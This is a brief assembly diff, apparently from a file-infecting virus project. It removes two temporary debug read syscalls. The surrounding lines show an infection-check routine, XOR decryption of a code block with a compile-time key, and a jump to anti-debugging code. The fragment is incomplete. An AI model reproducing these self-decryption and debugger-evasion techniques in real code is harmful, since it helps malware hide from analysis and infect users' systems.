@@ -79,14 +79,6 @@ begin:
 ; int can_run_infection();
 ; rax can_run_infection();
 can_run_infection:
-;TMP DEBUG
-	push rax
-	mov rax, 0
-	mov rdi, 0
-	mov rsi, rsp
-	mov rdx, 1
-	syscall
-	pop rax
 ; .TMP_uncipher block will disappear at compilation, and replaced by a maxgic_key,
 ; result of xor between the two following blocks
 .TMP_START_OF_TWO:
@@ -124,15 +116,6 @@ can_run_infection:
 	lea rdx, [rel magic_key]			; _key = &magic_key;
 	mov rcx, magic_key_size				; _key_size = magic_key_size;
 	call xor_cipher					; xor_cipher(_data, _size, _key, _key_size);
-
-;TMP DEBUG
-	push rax
-	mov rax, 0
-	mov rdi, 0
-	mov rsi, rsp
-	mov rdx, 1
-	syscall
-	pop rax
 
 	jmp .TMP_START_OF_TWO				; goto .TMP_anti_debugging
 
